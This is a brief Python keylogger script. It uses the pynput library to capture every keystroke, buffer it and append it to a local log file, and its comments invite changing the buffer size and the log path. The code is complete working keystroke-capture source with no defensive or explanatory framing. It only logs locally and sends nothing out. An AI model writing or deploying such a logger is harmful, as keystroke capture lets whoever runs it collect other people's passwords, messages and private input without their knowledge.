from pynput.keyboard import Key, Listener
k=[]# The Buffer used to load key strokes and write them on file
def on_press(key):
    global k
    print("{} pressed".format(key))
    if('Key.backspace'==str(key)):
        if(len(k)):
            k=k[:-1]
    else:
        k.append(str(key))
        if(len(k)>=10):# Can change the desired length of the buffer to be checked before writing
            writing()
            print(k)
            k=[]
def on_release(key):
    if key==Key.esc:
        return
def writing():
    global k
    with open("logfile.txt","a+") as f:# Can specify the path of the log file to be saved
        for x in k:
            x=x.replace("'","")
            if (x=='Key.space'):
                x=" "
            if (x=='Key.enter'):
                x="\n"
            f.write(x)
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
